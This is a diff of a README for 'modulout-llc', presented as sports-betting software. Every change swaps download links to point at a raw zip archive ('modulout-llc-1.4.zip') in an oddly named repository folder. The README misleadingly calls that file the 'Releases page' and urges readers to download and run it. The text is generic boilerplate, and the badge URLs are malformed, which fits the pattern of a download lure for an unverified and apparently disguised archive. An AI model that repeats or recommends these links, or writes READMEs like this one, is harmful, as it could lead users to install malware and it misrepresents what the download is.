@@ -1,6 +1,6 @@
 # 🎮 modulout-llc - Simplifying Your Betting Experience
 
-[![Download Now](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-2.0.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-2.0.zip)
+[![Download Now](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-1.4.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-1.4.zip)
 
 ## 📖 About This Project
 
@@ -11,7 +11,7 @@ Modulout LLC builds software to enhance your sports betting experience. Our key 
 To get started with modulout-llc, follow these simple steps:
 
 1. **Download the Application:**
-   - Visit this page to download: [Modulout Releases](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-2.0.zip). 
+   - Visit this page to download: [Modulout Releases](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-1.4.zip). 
 
 2. **Choose the Right Version:**
    - On the Releases page, you will find various versions of the software. Select the latest version for the best experience.
@@ -48,7 +48,7 @@ Our software offers several useful features:
 
 To download and install the software:
 
-1. **Go to the Releases Page:** Visit this page to download: [Modulout Releases](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-2.0.zip).
+1. **Go to the Releases Page:** Visit this page to download: [Modulout Releases](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-1.4.zip).
 2. **Select the File:** Choose the latest version that suits your operating system and click the download link.
 3. **Follow the Installation Steps:** Use the instructions provided above to install and run the application.
 
@@ -64,4 +64,4 @@ Feel free to share your feedback, suggestions, or thoughts about the application
 
 Follow us on social media to stay updated on the latest features and releases. We appreciate your support as we work to enhance our offerings.
 
-[![Download Now](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-2.0.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-2.0.zip)
+[![Download Now](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-1.4.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/guiziinn1/modulout-llc/main/diaclasis/modulout-llc-1.4.zip)
